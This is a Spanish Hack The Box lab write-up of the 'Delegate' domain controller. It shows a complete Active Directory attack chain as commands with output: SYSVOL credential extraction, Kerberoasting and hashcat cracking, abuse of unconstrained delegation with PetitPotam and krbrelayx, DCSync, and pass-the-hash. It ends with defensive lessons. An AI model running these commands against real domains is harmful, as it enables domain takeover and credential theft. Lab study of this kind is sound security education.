---
title: "Delegate"
description: "Writeup de Delegate - Hack The Box - Dificultad: Medium"
sidebar:
  badge:
    text: Medium
    variant: caution
tags:
  - htb
  - windows
  - medium
  - active-directory
  - sysvol
  - kerberoasting
  - unconstrained-delegation
  - petitpotam
  - dcsync
  - pass-the-hash
---
# 🖥️ Delegate
> 📅 Fecha: 2026-05-28
> 🎯 Plataforma: Hack The Box
> ⚙️ SO: Windows
> 🎚️ Dificultad: Medium
> 🌐 IP: `10.129.234.69`
> 👤 Autor: warrior866
---
## 📑 Tabla de Contenidos
- [Resumen Ejecutivo](#-resumen-ejecutivo)
- [Reconocimiento](#-reconocimiento)
- [Enumeración](#-enumeración)
- [Explotación Inicial (Foothold)](#-explotación-inicial-foothold)
- [Escalada Lateral](#-escalada-lateral)
- [Escalada de Privilegios](#-escalada-de-privilegios)
- [Flags](#-flags)
- [Lecciones Aprendidas](#-lecciones-aprendidas)
- [Referencias](#-referencias)
---
## 📝 Resumen Ejecutivo
Delegate es un Domain Controller Windows Server 2022 del dominio `delegate.vl`. El acceso inicial se obtiene extrayendo credenciales en texto claro desde un script `.bat` expuesto en el share SYSVOL, accesible de forma anónima. Con esas credenciales se realiza un Kerberoasting contra el usuario `N.Thompson`, cuyo hash TGS-REP se descifra en segundos con rockyou. Desde la sesión WinRM de N.Thompson se abusa de la `MachineAccountQuota` para crear una cuenta de equipo (`RELAY$`), se le añade un SPN y se activa la delegación sin restricciones (`TRUSTED_FOR_DELEGATION`). Finalmente, `PetitPotam` fuerza al DC a autenticarse contra `RELAY$` capturando el TGT de `DC1$` con `krbrelayx`, lo que permite un `secretsdump` DCSync y la obtención del hash NTLM del Administrador.

| Campo | Valor |
|-------|-------|
| Puntos débiles | Credenciales en SYSVOL, Kerberoasting, Unconstrained Delegation + PetitPotam |
| CVEs | N/A (misconfiguraciones de AD) |
| Herramientas | nmap, nxc, smbclient, bloodyAD, impacket, hashcat, evil-winrm, krbrelayx, PetitPotam |
| Tiempo total | ~4 horas 30 minutos |
---
## 🔍 Reconocimiento
### Registro en /etc/hosts
```bash
echo "10.129.234.69 delegate.vl DC1.delegate.vl" | sudo tee -a /etc/hosts
```
```text
10.129.234.69 delegate.vl DC1.delegate.vl
```
> 💡 **Análisis:** Se añaden entradas al archivo `/etc/hosts` para poder resolver los nombres del dominio `delegate.vl` y el hostname `DC1.delegate.vl` localmente, necesario para que Kerberos y las herramientas de AD funcionen correctamente.

### Escaneo de puertos (nmap)
```bash
nmap -p- -sS -sV -sC -O -T4 --min-rate=1000 --open -Pn 10.129.234.69
```
```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-28 09:27 -0400
Nmap scan report for 10.129.234.69
Host is up (0.17s latency).
Not shown: 65508 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-28 13:30:35Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-05-28T13:32:12+00:00; -13s from scanner time.
| ssl-cert: Subject: commonName=DC1.delegate.vl
| Not valid before: 2026-05-27T13:22:29
|_Not valid after:  2026-11-26T13:22:29
| rdp-ntlm-info:
|   Target_Name: DELEGATE
|   NetBIOS_Domain_Name: DELEGATE
|   NetBIOS_Computer_Name: DC1
|   DNS_Domain_Name: delegate.vl
|   DNS_Computer_Name: DC1.delegate.vl
|   DNS_Tree_Name: delegate.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-05-28T13:31:33+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664-49682/tcp open msrpc   Microsoft Windows RPC
[...]
Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
OS: Microsoft Windows Server 2022 (89%)
```
> 💡 **Análisis:** El perfil de puertos es inequívocamente el de un **Domain Controller**: DNS (53), Kerberos (88), LDAP/LDAPS (389/636/3268/3269), SMB (445), WinRM (5985) y RDP (3389). El nombre del equipo es `DC1`, el dominio `delegate.vl` y el sistema operativo Windows Server 2022 (build 20348). El SMB signing está activo, lo que descarta relay NTLM clásico. El puerto 5985 (WinRM) abierto es relevante para acceso remoto posterior.
---
## 🗂️ Enumeración
### SMB — Acceso anónimo y shares
```bash
nxc smb 10.129.234.69 -u 'anonymous' -p '' --shares
```
```text
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.69   445    DC1              [+] delegate.vl\anonymous:  (Guest)
SMB         10.129.234.69   445    DC1              [*] Enumerated shares
SMB         10.129.234.69   445    DC1              Share           Permissions     Remark
SMB         10.129.234.69   445    DC1              -----           -----------     ------
SMB         10.129.234.69   445    DC1              ADMIN$                          Remote Admin
SMB         10.129.234.69   445    DC1              C$                              Default share
SMB         10.129.234.69   445    DC1              IPC$            READ            Remote IPC
SMB         10.129.234.69   445    DC1              NETLOGON        READ            Logon server share
SMB         10.129.234.69   445    DC1              SYSVOL          READ            Logon server share
```
> 💡 **Análisis:** La sesión nula (null auth) funciona y el servidor acepta acceso como Guest. Los shares `NETLOGON` y `SYSVOL` son legibles sin autenticación. SYSVOL es especialmente interesante porque en entornos mal configurados almacena scripts de inicio de sesión que pueden contener credenciales en texto claro (patrón GPP/logon scripts).

### SYSVOL — Extracción de script de inicio de sesión
```bash
smbclient -N //dc1.delegate.vl/SYSVOL -c 'get delegate.vl\scripts\users.bat'
```
```text
getting file \delegate.vl\scripts\users.bat of size 159 as delegate.vl\scripts\users.bat (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
```
```bash
cat 'delegate.vl\scripts\users.bat'
```
```text
rem @echo off
net use * /delete /y
net use v: \\dc1\development
if %USERNAME%==A.Briggs net use h: \\fileserver\backups /user:Administrator P4ssw0rd1#123
```
> 💡 **Análisis:** ¡Credenciales en texto claro en SYSVOL! El script mapea una unidad de red para el usuario `A.Briggs` usando la contraseña `P4ssw0rd1#123`. Aunque el `/user:` aquí apunta a `Administrator` de un fileserver, lo primero que hay que comprobar es si esa contraseña también vale para `A.Briggs` en el dominio (reutilización de credenciales).
---
## 🚪 Explotación Inicial (Foothold)
### Validación de credenciales — A.Briggs
```bash
nxc smb 10.129.234.69 -u 'A.Briggs' -p 'P4ssw0rd1#123'
```
```text
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.69   445    DC1              [+] delegate.vl\A.Briggs:P4ssw0rd1#123
```
> 💡 **Análisis:** Credenciales válidas para `A.Briggs` en el dominio. El marcador `[+]` confirma autenticación exitosa. Ahora toca enumerar qué puede hacer este usuario en el directorio.

### Enumeración de permisos de escritura — bloodyAD
```bash
bloodyAD --host dc1.delegate.vl -d delegate.vl -u 'A.Briggs' -p 'P4ssw0rd1#123' get writable
```
```text
distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=delegate,DC=vl
permission: WRITE
distinguishedName: CN=A.Briggs,CN=Users,DC=delegate,DC=vl
permission: WRITE
distinguishedName: CN=N.Thompson,CN=Users,DC=delegate,DC=vl
permission: WRITE
```
> 💡 **Análisis:** `A.Briggs` tiene permisos de escritura sobre el objeto de `N.Thompson` en LDAP. Esto es significativo, pero antes de explotarlo hay otro vector: `N.Thompson` aparece en el resultado y tiene un SPN registrado (se descubrirá en el siguiente paso), lo que lo hace candidato a Kerberoasting.
---
## 🔄 Escalada Lateral
### Kerberoasting — N.Thompson
Se solicita el TGS de `N.Thompson` aprovechando que `A.Briggs` es un usuario autenticado del dominio.
```bash
impacket-GetUserSPNs delegate.vl/A.Briggs:'P4ssw0rd1#123' -dc-ip 10.129.234.69 -request-user N.THOMPSON
```
```text
ServicePrincipalName  Name        MemberOf                                         PasswordLastSet             LastLogon
--------------------  ----------  -----------------------------------------------  --------------------------  -------
fake/thompson         N.Thompson  CN=delegation admins,CN=Users,DC=delegate,DC=vl  2023-09-09 11:17:16.247262  2023-09-16 03:18:20.238500
$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$dc45a01105f27f92c4728d90d4499152$ab85e358f1a2bafd3db701f0685d6245d47af2505425b4876975852150503f64fae2aaad0bb78b2d7acb956860fba3d80e808828319325da02eb2352ae8ca610d174206c874a598c82ec62642569efd7acadc98fc51396af872dc3670fa8f0b56d71970d043701a149603f0ce89b5436784714e32c04d327b5b82029693a97f77287d58cee5b93a4baa9bf07a7ee217339620480eb89be4003a945a97f20943dc70b8b995ce804c21e1a30c7e62945e32437e361103dadb344a09e3aeb094596d75c5baeb102dd744df8d428b54a01acf191025527a6c5474ba06a352521b221c6d7527a8300b9648b381b0e3532af0b301b581ebad4b794162b87fd83fd5cbad93b56e2626d9789cd2cf8d5a89fdfbf0f0768a034f200c6361c9be51975e4cd18ba4b6b1a8fbe8d9a6bba5cd3956cfdbfed65d7d82ab6722d9258885ff7a2f78656d1799eea5880951c8f2567cb04d64f7048d340073b6c48316751ec7dcbeedc234cc6efbeec1d08134476a5acf92c6d77a29786312697763419b58a6d4ec7a7798bf1effe4aebc674b3d2e868fd619b012bd23d7ae558144b5c49fbe6fbe50991ae139c549e67e5fa13e1cd2a7bfd9c9b7b59c1566e1df1a78e89bcb1d30a33ac3f43105a8c95f24b138b291f5a20e1c67a46eed00661984ad59f3334adc083f1328a0cca89e8a0e95fee335e50a05e428e89a2c7e76ea8483ac0fa0572b842e910f0b93e7b7044f2dc7acf6ab9d1f7fae49d16d059cc22d7eb08d4ea8468e123f9e96332e70ac3c039f79d3ab50e0fc67cb0de3ff6ad7dc12315cebe21bb37383d8bb55d1b614a236cb07eda6de3c1496c29a8cb4fcd0c890dbbed13f7a5fe7fe30c858d08f571c2d1ae7c3f25a09d4163a32aee829fd38f9dbfb02b6b2e470fa1aa100914cc00f536bcc4151309290d179e580406628a5472deb26e2b7658b6b47c2f7bf16b9f3158399fd43854627d7da4e7ce4c5937cb52f323fd943930ee4138bdb5443fcf3ad9c1b20e271853713ba2d8f0d85598c91fcb340a865abbe4540d7adba250cdbaa0ee5201d59a95c57872addf8e6dc75e1a250150544db6666ad199c3c8202772cd5bb295a3d1560f9c5b854da4e6156cbc623249a559fdee20f534ba4fbce33aca43a55b2c4a170ac21d589df39a5a7a10a64c630e3ea5d008f7e9b6e037b8e62624352503fdfa985e447a2ef2b6daa41185497f07cb48d6ab07f3f66dcbd6577eeff9753829044265c02a8d36d77c428d6c83ab76e70d29803a125dc3bb44a38da3421259cae35594e6be1f35fec0d0cd1b1ea34510191127afc0889cf0188541ab8170510656e935de979d19504ccf17b47451da23f612d6a2ad04bed41e094881ac259efc6cb65f946ed1e3020157c7fa467bca73cd298512e9983e2081b6a500e73fd0941106c064bd7fb4215790834024201b181073ad14
```
> 💡 **Análisis:** `N.Thompson` es miembro de `delegation admins` y tiene el SPN `fake/thompson` registrado. El hash obtenido es de tipo `krb5tgs$23` (RC4), el más débil y más rápido de crackear offline. Se guarda en `hash.txt` para hashcat.

### Crackeo del hash TGS — hashcat
```bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```
```text
$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*[...]:KALEB_2341
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Time.Started.....: Thu May 28 11:34:24 2026 (4 secs)
Time.Estimated...: Thu May 28 11:34:28 2026 (0 secs)
Speed.#01........:  2868.5 kH/s (1.09ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 11005952/14344385 (76.73%)
```
**Credenciales obtenidas:**
```text
N.THOMPSON : KALEB_2341
```
> 💡 **Análisis:** El hash se crackea en 4 segundos con rockyou, lo que indica una contraseña débil. Con estas credenciales se abre WinRM (puerto 5985).

### Acceso WinRM — user flag
```bash
evil-winrm -i 10.129.234.69 -u 'N.THOMPSON' -p 'KALEB_2341'
```
```text
Evil-WinRM shell v3.9
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\N.Thompson\Desktop> cat user.txt
14bce88db0bbfc5019665f49f13d8fbd
```
📸 *Captura: shell como `N.Thompson` con lectura de `user.txt`.*
---
## 🚀 Escalada de Privilegios
### Vector: Unconstrained Delegation + PetitPotam
La cuenta `N.Thompson` pertenece al grupo `delegation admins` y la `MachineAccountQuota` (MAQ) del dominio es 10, lo que permite a cualquier usuario de dominio crear hasta 10 cuentas de equipo. La estrategia es:
1. Crear una cuenta de equipo (`RELAY$`) controlada por el atacante.
2. Añadirle un SPN para que sea un objetivo válido de delegación.
3. Activar `TRUSTED_FOR_DELEGATION` (delegación sin restricciones) sobre `RELAY$`.
4. Registrar el DNS de `relay.delegate.vl` apuntando a la IP del atacante.
5. Usar `krbrelayx` como listener para capturar TGTs.
6. Forzar la autenticación del DC hacia `relay` con `PetitPotam`.
7. Usar el TGT de `DC1$` para un DCSync y extraer el hash del Administrador.

### Paso 1 — Verificar MachineAccountQuota
```bash
nxc ldap 10.129.234.69 -u 'N.THOMPSON' -p 'KALEB_2341' -M maq
```
```text
LDAP        10.129.234.69   389    DC1              [+] delegate.vl\N.THOMPSON:KALEB_2341
MAQ         10.129.234.69   389    DC1              MachineAccountQuota: 10
```
> 💡 **Análisis:** MAQ=10 confirma que `N.Thompson` puede crear cuentas de equipo. Esto es la puerta de entrada para el ataque de delegación.

### Paso 2 — Crear cuenta de equipo RELAY$
```bash
impacket-addcomputer delegate.vl/N.THOMPSON:'KALEB_2341' -dc-ip 10.129.234.69 -computer-name 'RELAY$' -computer-pass 'Relay123!'
```
```text
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
[*] Successfully added machine account RELAY$ with password Relay123!.
```
> 💡 **Análisis:** Se crea `RELAY$` con credenciales conocidas por el atacante. Esta cuenta será el punto de captura de TGTs.

### Paso 3 — Añadir SPN a RELAY$ (addspn.py de krbrelayx)
```bash
python3 addspn.py -u 'delegate.vl\N.THOMPSON' -p 'KALEB_2341' -s 'cifs/relay' -t 'RELAY$' -dc-ip 10.129.234.69 10.129.234.69
```
```text
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
```
Verificación:
```bash
bloodyAD -d delegate.vl --dc-ip 10.129.234.69 -u 'N.THOMPSON' -p 'KALEB_2341' get object 'RELAY$' --attr 'servicePrincipalName'
```
```text
distinguishedName: CN=RELAY,CN=Computers,DC=delegate,DC=vl
servicePrincipalName: cifs/relay
```
> 💡 **Análisis:** El SPN `cifs/relay` es necesario para que el DC pueda emitir un ticket de servicio hacia `RELAY$` durante el ataque. `addspn.py` de la suite krbrelayx es la herramienta correcta para este paso (bloodyAD set object puede fallar en este escenario).

### Paso 4 — Activar TRUSTED_FOR_DELEGATION sobre RELAY$
```bash
bloodyAD -u 'N.THOMPSON' -d 'delegate.vl' -p 'KALEB_2341' --host '10.129.234.69' add uac 'RELAY$' -f TRUSTED_FOR_DELEGATION
```
```text
[-] ['TRUSTED_FOR_DELEGATION'] property flags added to RELAY$'s userAccountControl
```
> 💡 **Análisis:** Al activar `TRUSTED_FOR_DELEGATION`, `RELAY$` queda configurada con delegación sin restricciones (unconstrained delegation). Cualquier usuario o equipo que se autentique contra ella enviará su TGT completo, que el atacante puede capturar con `krbrelayx`.

### Paso 5 — Calcular NT hash de la contraseña de RELAY$
```bash
python3 -c 'import hashlib,binascii; print(binascii.hexlify(hashlib.new("md4", "Relay123!".encode("utf-16le")).digest()).decode())'
```
```text
1bac2a2567498dcf7fcc7007396c7999
```
> 💡 **Análisis:** `krbrelayx` necesita el NT hash de `RELAY$` para descifrar los TGTs entrantes. Se calcula localmente sin necesidad de crackeo.

### Paso 6 — Verificar resolución DNS de relay.delegate.vl
Se espera al menos 180 segundos tras la creación de `RELAY$` para que el registro DNS se propague.
```bash
dig relay.delegate.vl @10.129.234.69
```
```text
;; ANSWER SECTION:
relay.delegate.vl.      180     IN      A       10.10.15.56
```
> 💡 **Análisis:** El DC resuelve `relay.delegate.vl` a la IP del atacante (`10.10.15.56`). Esto es fundamental para que `PetitPotam` dirija la autenticación del DC hacia el listener de `krbrelayx`.

### Paso 7 — Levantar krbrelayx como listener
```bash
sudo python3 krbrelayx.py -hashes :1bac2a2567498dcf7fcc7007396c7999
```
```text
[*] Running in unconstrained delegation abuse mode using the specified credentials.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server
[*] Servers started, waiting for connections
```
> 💡 **Análisis:** `krbrelayx` queda en escucha esperando autenticaciones. En modo unconstrained delegation, cualquier TGT que llegue se guardará en disco como archivo `.ccache`.

### Paso 8 — Disparar autenticación con PetitPotam
En una segunda terminal, mientras `krbrelayx` escucha:
```bash
python3 PetitPotam.py -target-ip 10.129.234.69 -u 'RELAY$' -p 'Relay123!' relay dc1.delegate.vl
```
```text
Trying pipe lsarpc
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```
Salida en krbrelayx:
```text
[*] SMBD: Received connection from 10.129.234.69
[*] Got ticket for DC1$@DELEGATE.VL [krbtgt@DELEGATE.VL]
[*] Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
```
> 💡 **Análisis:** `PetitPotam` usa MS-EFSRPC para forzar al DC (`DC1`) a autenticarse contra `relay.delegate.vl`. Como `RELAY$` tiene unconstrained delegation, el TGT completo de la cuenta de equipo `DC1$` se entrega y captura. `EfsRpcOpenFileRaw` está parcheado pero `EfsRpcEncryptFileSrv` sigue siendo vulnerable.

### Paso 9 — DCSync con el TGT de DC1$
```bash
KRB5CCNAME=DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache impacket-secretsdump -just-dc-user Administrator -k dc1.delegate.vl
```
```text
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c32198ceab4cc695e65045562aa3ee93:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f877adcb278c4e178c430440573528db38631785a0afe9281d0dbdd10774848c
Administrator:aes128-cts-hmac-sha1-96:3a25aca9a80dfe5f03cd03ea2dcccafe
Administrator:des-cbc-md5:ce257f16ec25e59e
[*] Cleaning up...
```
> 💡 **Análisis:** Con el TGT de `DC1$` (cuenta de equipo del Domain Controller) se tienen privilegios de replicación de directorio. `secretsdump` usa DRSUAPI para extraer el hash NTLM del Administrador directamente de NTDS.DIT. No se necesita crackear, se puede usar directamente con Pass-the-Hash.

### Paso 10 — Acceso como Administrator (Pass-the-Hash)
```bash
evil-winrm -i 10.129.234.69 -u Administrator -H c32198ceab4cc695e65045562aa3ee93
```
```text
Evil-WinRM shell v3.9
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
4824d11906dc30ea675bfb15066d2986
```
📸 *Captura: shell como `Administrator` con lectura de `root.txt`.*
---
## 🏁 Flags
| Flag | Hash |
|------|------|
| user.txt | `14bce88db0bbfc5019665f49f13d8fbd` |
| root.txt | `4824d11906dc30ea675bfb15066d2986` |
---
## 🎓 Lecciones Aprendidas
- **Nunca almacenar credenciales en scripts de SYSVOL.** Los logon scripts accesibles anónimamente son una fuente crítica de credential exposure. Usar LAPS o mecanismos seguros de distribución de credenciales.
- **Kerberoasting en cuentas de servicio con SPNs falsos.** Un SPN como `fake/thompson` delata una configuración deliberada para habilitar delegación, pero también expone la cuenta a Kerberoasting. Las cuentas Kerberoasteables deben tener contraseñas largas y aleatorias (>25 caracteres), o usar cuentas MSA/gMSA.
- **MachineAccountQuota = 0 en entornos seguros.** Con MAQ > 0, cualquier usuario de dominio puede crear cuentas de equipo y abusar de delegación. Reducirla a 0 en `ms-DS-MachineAccountQuota` elimina este vector.
- **Unconstrained Delegation es peligrosa.** Ningún servidor (salvo DCs) debería tener `TRUSTED_FOR_DELEGATION`. Usar Constrained Delegation o Resource-Based Constrained Delegation con revisión periódica de objetos con este flag.
- **PetitPotam (MS-EFSRPC) sigue siendo explotable.** El parche de Microsoft solo cierra `EfsRpcOpenFileRaw`; `EfsRpcEncryptFileSrv` y otras funciones pueden seguir siendo vulnerables. Mitigación: deshabilitar EFS si no se usa, aplicar los parches de seguridad correspondientes, y usar `Netlogon` protections.
- **Error cometido:** Intentar añadir el SPN con `bloodyAD set object` fallaba; la herramienta correcta para este caso es `addspn.py` del toolkit de `krbrelayx`. Importante conocer las herramientas específicas de cada operación.
---
## 📚 Referencias
- [HackTricks - Kerberoasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast)
- [HackTricks - Unconstrained Delegation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/unconstrained-delegation)
- [HackTricks - PetitPotam](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/printers-spooler-service-abuse)
- [krbrelayx - dirkjanm](https://github.com/dirkjanm/krbrelayx)
- [PetitPotam - topotam](https://github.com/topotam/PetitPotam)
- [impacket - Fortra](https://github.com/fortra/impacket)
- [GTFOBins](https://gtfobins.github.io/)
- [bloodyAD](https://github.com/CravateRouge/bloodyAD)
- [MachineAccountQuota abuse - noPac / MAQ](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation)